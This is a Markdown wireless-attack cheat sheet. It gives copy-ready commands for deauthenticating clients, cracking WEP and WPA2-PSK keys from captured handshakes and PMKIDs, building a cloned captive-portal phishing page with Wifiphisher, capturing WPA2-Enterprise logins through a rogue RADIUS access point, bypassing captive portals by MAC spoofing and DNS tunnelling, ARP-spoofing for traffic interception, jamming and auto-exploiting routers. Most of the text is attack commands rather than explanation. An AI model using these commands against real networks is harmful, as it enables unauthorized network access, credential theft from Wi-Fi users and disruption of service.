# Some Key Terms
- **SSID** - The network's name that you see and try to connect.
- **Access Point** — The WIFI network that you want to connect to
- **ESSID** - For Aircrack they normally refer to the network you're attacking.
- **BSSID** - An access point MAC address 
- **WPA2-PSK** - WIFI networks that you connect to by providing a password that's the same for everyone
- **WPA2-EAP** - WIFI networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
- **RADIUS** - A Server for authenticating clients, not just for WIFI
- **Monitor Mode** -  Capturing the network packets in the air without connecting to a router or access point.

# Important Tools
- [**Aircrack**]([https://www.aircrack-ng.org/](https://www.aircrack-ng.org/))
	- The tools focus on different security layers such as packet capture, replay attacks, deauthentication, fake access points, and packet injection.
	- Checks Wi-Fi cards and drives capabilities are also available, as is a cracking module for WEP, WPA PSK (WPA 1 and 2)
- [**Airsnort**]([https://sourceforge.net/projects/airsnort/](https://sourceforge.net/projects/airsnort/))
	- Capable of cracking encryption keys on 802.11b WEP networks.
	- Monitors transmissions, computing the encryption key when enough packets have been gathered.
- [**Kismet**](https://www.kismetwireless.net/)
	- Acts as a sniffer, wardriving tool, and wireless intrusion detection framework.
	- Works with Wi-Fi and Bluetooth interfaces, radio software and other capture hardware.
- [**Wifiphisher**]([https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher))
	- This tool is a rogue access point framework that creates a MiTM agent between wireless clients by performing targeted Wi-Fi association attacks.
- [**Reaver**]([https://github.com/t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x))
	- It is a tool that implements a brute force mechanism against Wi-Fi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.
# Basic Commands
- **Check interface mode & Status**
	- `iwconfig <interface>`
	- `ifconfig <interface>`
- **Setting monitor mode**
	- `airmon-ng check kill`
	- `iwconfig <int> down && iwconfig <int> mode monitor && ifconfig <int> up`
- **List Networks**
	> List the networks using Airodump-ng and get the AP's MAC address and one from a client. Do not stop the capture.
	- First set  **Monitor Mode**
	- Use **Airdump-ng**
		- `airodump-ng <int> -c <channel> -e <ESSID>`
- **Deauthentication**
	>In another terminal, deauthenticate a client or all of them. When Airodump-ng captures a handshake from this network, the name or ESSID will appear in the first terminal.
	- Use **Aireplay-ng**
		- For **One client**
			- `aireplay-ng -0 <num of deauth packets> -a <access point MAC> -c <Client MAC> <int>`
		- For **ALL** clients in an AP
			- `aireplay-ng -0 <num of deauth packets> -a <access point MAC>`

# Open Network
## Captive Portal
- **Fake Captive Portal**
	- Clone the Website Using **[HTTrack](https://www.httrack.com)**
	- Using **[Wifiphiser](https://github.com/wifiphisher/wifiphisher)** 
		> Add the HTTrack result in a new folder in wifiphisher/data/phishing-pages/new_page/html and a configuration file in wifiphisher/data/phishing-pages/new_page/config.ini. and Recompile the project using `python setup.py` or the binary in bin.
		- ``./wifiphisher -aI <int> -e <ESSID> --force-hostapd -p <plugin> -nE`
	- **Bypass Methodology** -
		-  **MAC Spoofing**
			- Change your MAC address to one of an already authenticated user which can be found with network scanning tools such as **Nmap**.
				- `sudo nmap -sn <network IP>`
			- For  changing  your IP and MAC address use **macchanger**.
				- `macchanger -m XX:XX:XX:XX:XX:XX <int>`
				- `macchanger -r <int>` (for random mac address)
				- `macchanger -p <int>` (for reverting changes)			
			- Alternative automated scripts, [Poliva Script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh) and [HackCaptivePortals](https://github.com/systematicat/hack-captive-portals)
		- **DNS Tunneling**
			-  It is necessary to have an accessible DNS server of your own.
			- Check the domains names,
				- `nslookup example.com`
			- Create 2 DNS records (in Afraid.org)
				- One **A Record** (eg: dns.domain.com (ip))
				- One **NS Record** (eg: hack.domain.com dns.domain.com)
			- Execution in the **Server** 
				- Using [Iodine](https://code.kryo.se/iodine/)
					- `iodined -f -c -P <pass> -n <server ip> <name>.<domain>` . Check if its working correctly from [here](https://code.kryo.se/iodine/check-it/)
			- Execution in **Client** 
				- `iodine -f -P <pass> <dns server ip> <name>.<domain>`
			- Creating tunnel
				- `ssh -D 8080 <user>@<server ip>`
			
## Man in the Middle Attack
- **Test if the network is vulnerable to MITM attack**
	- **Arp spoofing** attacks using ettercap
		- `ettercap -T -M arp // //` (Perform the ARP poisoning attack against all the hosts in the LAN.) 
		- `ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.<range>` (Perform the ARP poisoning against the gateway and the hosts.  The 'remote' option is needed to be able to sniff the remote traffic the hosts make through the gateway)
	- Sniff the traffic using **Wireshark** or **TCPDump**
	- Analyze the traffic 
		- For **Linux** 
			- [PCredz](https://github.com/lgandx/PCredz)
		- For **Windows**
			- [Network Miner](https://www.netresec.com/?page=networkminer)

# WEP Cracking
- **Capturing**
	- `airodump-ng -c <AP channel> --bssid <AP MAC> -w <.pcap file> <INT>`
- Accelerate the IV (Initialization Vector) capture using **Fake authentication** + **Arp Request Replay Attack** + **Deauthenticate user**.
	- `aireplay-ng -1 0 -e <AP NAME> -a <AP MAC> -h <OUR MAC> <INT>`
	- `aireplay-ng -3 -b <AP MAC> -h <OUR MAC> <INT>`
	- `aireplay-ng -0 1 -a <AP MAC> -c <STATION MAC> <INT>`
- Cracking the password using **Aircrack-ng**
	- `aircrack-ng <.pcap file>`

# WPA2 -PSK Cracking
## Cracking the 4 Way Handshake
- **Start Capture**
	- `airodump-ng -c <AP CHANNEL> --bssid <AP MAC> -w <PCAP FILE> <INT>`
- **Deauthenticate** an user. Stop airodump capture when you see a message **WPA handshake: (MAC)**
	- `aireplay-ng -0 1 -a <AP MAC> -c <STATION MAC> <INT>`
- **Crack the handshake**
	- Using **Aircrack-ng**
		- `aircrack-ng -w <wordlist> <captured .pcap file>`
	- Using **Pyrit** 
		- `git clone https://github.com/hacker3983/pyrit-installer.git`
		- `pyrit -r $PCAP_FILE analyze`
		- `pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip`
		- `pyrit -i $WORDLIST import_passwords`
		- `pyrit eval`
		- `pyrit batch`
		- `pyrit -r $CLEAN_PCAP_FILE attack_db`
	- Recommended Wordlists: https://github.com/kennyn510/wpa2-wordlists
## PMKID Attack
> PMK caching is used to establish smooth roaming for time sensitive applications.
- First Install the following tools, 
	- **Hcxdumptool**
		- `git clone https://github.com/ZerBea/hcxdumptool.git`
		- `cd hcxdumptool && make && make install`
	- **Hcxtools**
		- `git clone https://github.com/ZerBea/hcxtools.git`
		- `cd hcxtools && make && make install`
- Stop Network Manager
	- `airmon-ng check kill`
- Create a text file (Filter File Name) and add the MAC address without ":". You can use sed and redirect the output to a file
	- `echo $MAC | sed 's/://g' > <filter file name>`
- Capture **PMKID**
	- `hcxdumptool -i <int> -o <output.pcap> --enable_status=1 --filterlist=<filter file name> --filtermode=2`
- Create **Hash File**
	- `hcxpcaptool -z <hash file> <output.pcap>`
- Crack the Hash using **Hashcat**
	- `hashcat -a 0 -m 16800 <hash file> <wordlist> --force`

# WPA2 Enterprise 
## Fake Access Points
- **Installation**
	- `git clone https://github.com/ricardojoserf/WPA_Enterprise_Attack`
	- `cd WPA_Enterprise_Attack && sudo sh install.sh`
- **Freeradius-wpe**
	- Start access point,
		- `sh freeradius_wpe_init.sh <AP name> <Interface>`
	- For reading Logs after victim connects
		- `sh freeradius_wpe_read.sh`

# Other Attacks
- **Krack Attack**
	- More info about this attack https://www.krackattacks.com
	- `git clone https://github.com/vanhoefm/krackattacks-scripts`
	- `cd krackattack && ./pysetup.sh`
- **Wifi Jamming**
	- This program can send deauthentication packets to both APs and clients
	- `git clone https://github.com/DanMcInerney/wifijammer.git`
	- `sudo ./wifijammer -i <int> -s <FAKE AP MAC>`

# Post Exploitation
**Once you are connected to the Network**
## Attacking the Router
- Using **Routersploit**
	- `git clone https://github.com/threat9/routersploit.git`
	- Exploitation Framework for Embedded Devices - Test `use scanners/autopwn`

## Types of Scanning
- Nmap/Zenmap 
- [Masscan](https://github.com/robertdavidgraham/masscan) - Faster version of Nmap (It can break things, so be careful)
	- `masscan 10.0.0.0/8 -p80 --banners --source-ip <ip>`
	- `masscan 2a00:1450:4007:810::/112 -p80 --banners --source-ip <MAC>`
- [Netdiscover](https://github.com/netdiscover-scanner/netdiscover) - ARP sniffing. Very useful if the networks are very well segmented.
	- `netdiscover -i <int> -r <network>`

## Spoofing 
- [Ettercap](https://github.com/Ettercap/ettercap.git)  - Checks if you can do a MitM attack and sniff all the traffic in the network
	- `sudo -E Ettercap -G`
- [Responder](https://github.com/SpiderLabs/Responder) 
	- `responder -wF -I <ip>`
- [Yersinia](https://github.com/tomac/yersinia)
	- `yersinia -G`
